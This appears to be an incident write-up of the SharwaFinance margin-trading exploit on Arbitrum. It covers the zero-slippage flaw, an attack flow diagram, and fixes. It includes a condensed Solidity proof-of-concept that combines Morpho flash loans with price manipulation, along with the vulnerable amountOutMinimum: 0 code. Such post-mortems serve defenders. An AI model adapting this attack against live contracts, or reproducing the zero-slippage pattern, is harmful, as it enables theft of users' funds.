# SharwaFinance — Slippage Manipulation Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2025-10-30 |
| **Protocol** | SharwaFinance |
| **Chain** | Arbitrum |
| **Loss** | ~146,000 USD |
| **Attacker** | [0xd356c82e0c85e1568641d084dbdaf76b8df96c08](https://arbiscan.io/address/0xd356c82e0c85e1568641d084dbdaf76b8df96c08) |
| **Attack Tx** | [0xd64729c5...](https://app.blocksec.com/explorer/tx/arbitrum/0xd64729c528e6689cb18b0c90345ab0c9ed18fea44247c89af2f1374643fc89c2) |
| **Vulnerable Contract** | [0xd3fde5af30da1f394d6e0d361b552648d0dff797](https://arbiscan.io/address/0xd3fde5af30da1f394d6e0d361b552648d0dff797) |
| **Root Cause** | No slippage validation on margin trading position increase/decrease, allowing price manipulation to extract excess collateral |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-10/SharwaFinance_exp.sol) |

---

## 1. Vulnerability Overview

SharwaFinance is a margin trading protocol that allows users to provide collateral and open leveraged positions. The `increaseLongPosition` and `decreaseLongPosition` functions lack slippage validation, enabling an attacker to borrow liquidity via Morpho flash loans, manipulate the price of position-related tokens, and then close the position at the manipulated price to extract more collateral than the actual value.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable pattern: position increase/decrease without slippage protection
interface TradeRouter {
    function increaseLongPosition(
        uint256 id,
        address token,
        uint256 amount
    ) external;
    // No amountOutMinimum parameter → unlimited slippage

    function decreaseLongPosition(
        uint256 id,
        address token,
        uint256 amount
    ) external;
    // Likewise, no slippage protection
}

// ✅ Recommended fix: add minimum output amount parameter
interface TradeRouter {
    function increaseLongPosition(
        uint256 id,
        address token,
        uint256 amount,
        uint256 minAmountOut  // slippage protection
    ) external;
}
```

### On-Chain Source Code

Source: Sourcify verified

**TradeRouter.sol** → delegates to FacadeTradeRouter:
```solidity
// File: contracts/oneClick/routers/TradeRouter.sol
function increaseLongPosition(
    uint marginAccountID, address token, uint amount
) external onlyApprovedOrOwner(marginAccountID) {
    // ❌ Delegates to FacadeTradeRouter without minAmountOut parameter
    facadeTradeRouter.increaseLongPosition(marginAccountID, token, amount);
}
```

**FacadeTradeRouter.sol** — the actual vulnerable point:
```solidity
// File: contracts/oneClick/facades/FacadeTradeRouter.sol
function _closePartialLongPosition(
    uint marginAccountID, address token, uint amount, int256 collateralAmount
) private {
    IFacadeInput.SwapData[] memory swapsData = new IFacadeInput.SwapData[](4);
    // ...
    swapsData[0] = IFacadeInput.SwapData({
        tokenIn: token,
        amountIn: amount,
        amountOutMinimum: 0  // ❌ Slippage protection hardcoded to 0 — fully exposed to price manipulation
    });
    facadeInput.multiSwapInputRepay(marginAccountID, token, usdc, swapsData, swapOutputData, repayAmount);
}

function _closeFullLongPosition(
    uint marginAccountID, address token, uint amount, int256 collateralAmount
) private {
    // ...
    swapsData[0] = IFacadeInput.SwapData({
        tokenIn: token,
        amountIn: amount,
        amountOutMinimum: 0  // ❌ Same — slippage hardcoded to 0
    });
    // ...
}
```


## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[1]─▶ Create MarginAccount NFT
  │
  ├─[2]─▶ Morpho flash loan (borrow large amount of tokens) [attackTx1]
  │         └─ provide to supply token pool → distort price
  │
  ├─[3]─▶ Call increaseLongPosition
  │         └─ No slippage → enter position at manipulated price
  │
  ├─[4]─▶ Repay flash loan (price recovers)
  │
  ├─[5]─▶ Second Morpho flash loan [attackTx2]
  │         └─ Price manipulation in opposite direction
  │
  ├─[6]─▶ Call decreaseLongPosition
  │         └─ Close position at manipulated favorable price
  │             Receive more collateral than actual value
  │
  └─[7]─▶ Retain ~146,000 USD profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function attackTx1() external {
    // [1] Create margin account
    uint256 tokenId = IMarginAccountManager(marginAccountManager).createMarginAccount();

    // [2] Borrow large amount of tokens via Morpho flash loan
    IMorpho(morpho).flashLoan(flashToken, flashAmount, abi.encode(tokenId, Phase.INCREASE));
}

function onMorphoFlashLoan(uint256 assets, bytes calldata data) external {
    (uint256 tokenId, Phase phase) = abi.decode(data, (uint256, Phase));

    if (phase == Phase.INCREASE) {
        // [3] Provide tokens to supply pool → manipulate price
        ISupplyTokenPool(supplyPool).provide(assets);

        // [4] Increase position without slippage → enter at manipulated price
        IMarginTradingRouter(marginTradingRouter).provideERC20(tokenId, flashToken, assets);
        TradeRouter(tradeRouter).increaseLongPosition(tokenId, flashToken, positionSize);

        // [5] Repay flash loan
        IERC20(flashToken).transfer(msg.sender, assets);
    } else {
        // [6] Manipulate price in opposite direction, then close position
        TradeRouter(tradeRouter).decreaseLongPosition(tokenId, flashToken, positionSize);
        // No slippage → receive excess collateral at manipulated favorable price
        IERC20(flashToken).transfer(msg.sender, assets);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Missing Slippage Protection |
| **Attack Vector** | Flash loan + price manipulation + slippage-free position manipulation |
| **Impact Scope** | Protocol fund drainage via margin positions |
| **CWE** | CWE-20: Improper Input Validation |
| **DASP Classification** | Price Manipulation / Missing Slippage |

## 6. Remediation Recommendations

1. **Mandatory slippage parameter**: Add a `minAmountOut` parameter to `increaseLongPosition`/`decreaseLongPosition`.
2. **Internal price oracle**: Use a manipulation-resistant TWAP oracle instead of external AMM prices.
3. **Position size limits**: Cap the maximum position size changeable within a single transaction.
4. **Margin account cooldown**: Apply a timelock requiring a certain period to elapse after a position increase before it can be closed.

## 7. Lessons Learned

- In margin trading protocols, missing slippage protection is a direct entry point for price manipulation attacks.
- Leveraged position increases and closures must always explicitly validate slippage bounds.
- Even when an attack is split across two separate transactions, the underlying vulnerability remains the same.